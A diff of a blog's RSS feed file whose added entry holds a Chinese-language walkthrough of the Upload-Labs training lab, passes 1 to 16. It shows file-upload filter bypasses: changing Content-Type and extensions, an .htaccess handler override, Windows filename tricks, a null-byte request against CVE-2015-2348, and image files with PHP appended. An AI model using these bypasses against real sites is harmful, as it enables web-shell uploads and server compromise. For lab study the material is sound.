@@ -1,1 +1,570 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>上传绕过 on Zeddy's Blog</title><link>https://zeddyu.github.io/tags/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</link><description>Recent content in 上传绕过 on Zeddy's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 18 Mar 2019 19:48:17 +0000</lastBuildDate><atom:link href="https://zeddyu.github.io/tags/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/atom.xml" rel="self" type="application/rss+xml"/><item><title>UploadLab WriteUp</title><link>https://zeddyu.github.io/2019/03/18/UploadLab-WriteUp/</link><pubDate>Mon, 18 Mar 2019 19:48:17 +0000</pubDate><guid>https://zeddyu.github.io/2019/03/18/UploadLab-WriteUp/</guid><description>&lt;p>The writeup of UploadLab.&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>上传绕过 on Zeddy's Blog</title><link>https://zeddyu.github.io/tags/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</link><description>Recent content in 上传绕过 on Zeddy's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 18 Mar 2019 19:48:17 +0000</lastBuildDate><atom:link href="https://zeddyu.github.io/tags/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/atom.xml" rel="self" type="application/rss+xml"/><item><title>UploadLab WriteUp</title><link>https://zeddyu.github.io/p/uploadlab-writeup/</link><pubDate>Mon, 18 Mar 2019 19:48:17 +0000</pubDate><guid>https://zeddyu.github.io/p/uploadlab-writeup/</guid><description>&lt;p>The writeup of UploadLab.&lt;/p>
+&lt;h2 id="upload-labs">Upload-Labs
+&lt;/h2>&lt;p>Info.php 代码为&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="pass-01">Pass-01
+&lt;/h3>&lt;p>随便上传一个 shell 发现回显&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>发现是个前端检查，改成&lt;code>.jpg&lt;/code>绕过，用 burp 抓包再改成&lt;code>.php&lt;/code>即可&lt;/p>
+&lt;h3 id="pass-02">Pass-02
+&lt;/h3>&lt;p>上传 info.php 发现回显&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">提示：文件类型不正确，请重新上传！
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>抓包将修改上传文件字段:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Content-Type: image/jpeg
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="pass-03">Pass-03
+&lt;/h3>&lt;p>上传 info.php 发现回显&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>黑名单绕过，将后缀名改成&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">filename=&amp;#34;shell.php5&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>apache 的&lt;code>httpd.conf&lt;/code>中有如下配置代码&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">AddType application/x-httpd-php .php .phtml .phps .php5 .pht
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="pass-04">Pass-04
+&lt;/h3>&lt;p>上传 info.php 发现回显&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">此文件不允许上传!
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>但是上传一个图片发现是没有改文件名的。看代码发现几乎所有能用的后缀名都进了黑名单，唯独没有&lt;code>.htaccess&lt;/code>，于是我们可以上传&lt;code>.htaccess&lt;/code>，文件内容如下&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">SetHandler application/x-httpd-php
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>可以将当前目录下所有文件都当作 php 文件处理，这时候传个改了后缀的 php 文件就好&lt;/p>
+&lt;h3 id="pass-05">Pass-05
+&lt;/h3>&lt;p>虽然&lt;code>.htaccess&lt;/code>被过滤了，但是审计代码发现转换大小写，可以用大小写绕过&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">filename=&amp;#34;info.PHP&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="pass-06">Pass-06
+&lt;/h3>&lt;p>发现少了&lt;code>trim()&lt;/code>函数，没有进行去空处理，后缀加个空格就好了&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">filename=&amp;#34;info.php &amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="pass-07">Pass-07
+&lt;/h3>&lt;p>发现没有去除末尾的点，所以我们可以用&lt;code>info.php.&lt;/code>来绕过，在 windows 环境下，会自动去掉后缀名中最后的&lt;code>.&lt;/code>&lt;/p>
+&lt;h3 id="pass-08">Pass-08
+&lt;/h3>&lt;p>发现没有去除&lt;code>::$DATA&lt;/code>，可以在末尾添加&lt;code>::$DATA&lt;/code>，这个在 windows 环境下也会解析。&lt;/p>
+&lt;h3 id="pass-09">Pass-09
+&lt;/h3>&lt;p>这里用&lt;code>info.php. .&lt;/code>绕过，注意中间有一个空格。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$file_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">trim&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span> &lt;span class="c1">//info.php. .
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$file_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">deldot&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file_name&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="c1">//删除文件名末尾的点 //info.php.空格
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file_ext&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$deny_ext&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$temp_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$img_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">UPLOAD_PATH&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nv">$file_name&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// UPLOAD_PATH/.info.php.空格
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>同样，windows 环境下自动忽略末尾的&lt;code>.&lt;/code>与空格&lt;/p>
+&lt;h3 id="pass-10">Pass-10
+&lt;/h3>&lt;p>置换了关键字，可以双写绕过，但是注意顺序，例如&lt;code>info.pphphp&lt;/code>，因为&lt;code>phphpp&lt;/code>这样会置换第一个&lt;code>php&lt;/code>为空，就形成了后缀&lt;code>.hpp&lt;/code>&lt;/p>
+&lt;h3 id="pass-11">Pass-11
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$is_upload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">null&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;submit&amp;#39;&lt;/span>&lt;span class="p">])){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$ext_arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;jpg&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;png&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;gif&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$file_ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="nx">strrpos&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="s2">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file_ext&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ext_arr&lt;/span>&lt;span class="p">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$temp_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$img_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;save_path&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">99&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">date&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;YmdHis&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nv">$file_ext&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$temp_file&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$img_path&lt;/span>&lt;span class="p">)){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$is_upload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;上传出错！&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>从源代码可以发现，虽然用了白名单模式，但是我们可以控制上传路径，利用&lt;a class="link" href="http://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener"
+>CVE-2015-2348&lt;/a>进行 00 截断&lt;/p>
+&lt;p>漏洞影响版本必须在5.4.x&amp;lt;= 5.4.39，5.5.x&amp;lt;= 5.5.23，5.6.x &amp;lt;= 5.6.7&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/Pass-11/index.php?save_path=../upload/test.php%00&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">localhost:8002&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Referer&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">http://localhost:8002/Pass-11/index.php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">multipart/form-data; boundary=---------------------------1397349150366000458976532598&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">356&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------1397349150366000458976532598
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;upload_file&amp;#34;; filename=&amp;#34;info.jpg&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Type: text/php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;?php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">phpinfo();
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">?&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------1397349150366000458976532598
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Disposition: form-data; name=&amp;#34;submit&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">上传
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------------1397349150366000458976532598--
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="pass-12">Pass-12
+&lt;/h3>&lt;p>只是把11中的路径改成了&lt;code>$_POST['save_path']&lt;/code>，方法无异&lt;/p>
+&lt;h3 id="pass-13">Pass-13
+&lt;/h3>&lt;p>找几个 png 、 jpg 或者 gif 图片直接用&lt;code>echo &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot; &amp;gt;&amp;gt; xxx.jpg&lt;/code>就可以做成图片马了，直接用文件包含漏洞即可&lt;/p>
+&lt;h3 id="pass-14">Pass-14
+&lt;/h3>&lt;p>和13一样，只不过13 check 前面两字节的数据头，14用了以下代码更为严格，但是我们用13的方法是在图片末尾追加的代码段，整个图片还是个完整的图片没有被破坏，也就绕过了检测&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$info&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$filename&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">image_type_to_extension&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$info&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="pass-15">Pass-15
+&lt;/h3>&lt;p>同14关&lt;/p>
+&lt;h3 id="pass-16">Pass-16
+&lt;/h3>&lt;p>详细参考&lt;a class="link" href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener"
+>upload-labs之pass 16详细分析&lt;/a>&lt;/p>
